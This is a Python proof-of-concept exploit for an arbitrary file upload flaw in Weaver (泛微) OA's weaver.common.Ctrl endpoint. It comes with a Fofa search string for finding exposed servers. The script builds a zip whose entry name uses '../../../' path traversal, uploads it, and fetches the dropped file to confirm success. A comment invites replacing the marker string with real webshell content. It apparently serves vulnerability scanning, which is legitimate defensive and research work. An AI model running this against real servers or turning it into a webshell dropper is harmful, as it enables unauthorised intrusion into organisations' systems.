# -*- coding: utf-8 -*-
# 泛微OA weaver.common.Ctrl 任意文件上传
# Fofa:  app="泛微-协同办公OA"

import zipfile
import random, os
import requests, re, urllib

def file_zip(mm, webshell_name2):
    shell = """yhsnksianksxouwyqnalifhasdnslxzhdydklosicys"""  ## 替换shell内容
    zf = zipfile.ZipFile(mm + '.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr(webshell_name2, shell)

#mm = generate_random_str(8)
def weaver_common_ctrl_upload(urllist):
    relsult = {
        'name': '泛微OA weaver.common.Ctrl 任意文件上传漏洞',
        'vulnerable': False
    }
    path = str(os.path.abspath('.'))
    mm = path + '\pocs\web\weaver\TestFile_weaver_common_ctrl_upload'
    del_file = './{0}.zip'.format(mm)    # 生成的垃圾文件
    webshell_name1 = mm + '.txt'
    webshell_name2 = '../../../' + webshell_name1
    try:
        file_zip(mm, webshell_name2)
        urls = urllist + 'weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
        file = [('file1', (mm + '.zip', open(mm + '.zip', 'rb'), 'application/zip'))]

        requests.post(url=urls, files=file, timeout=3, verify=False)
        GetShellurl = urllib.parse.urljoin(urllist, 'cloudstore/' + webshell_name1)
        GetShelllist = requests.get(url=GetShellurl, timeout=3, verify=False)
        if GetShelllist.status_code == 200 and re.search(r'yhsnksianksxouwyqnalifhasdnslxzhdydklosicys', GetShelllist.text):
            relsult['vulnerable'] = True
            relsult['url'] = urllist
            relsult['verify'] = GetShellurl
            relsult['about'] = 'https://mp.weixin.qq.com/s/ePYRFPfu-pvWMKSiffporA, https://www.xpshuai.cn/posts/20282/'
            return relsult
        else:
            return relsult
    except:
        return relsult



if __name__ == '__main__':
    url = input('url:')
    print(weaver_common_ctrl_upload(url))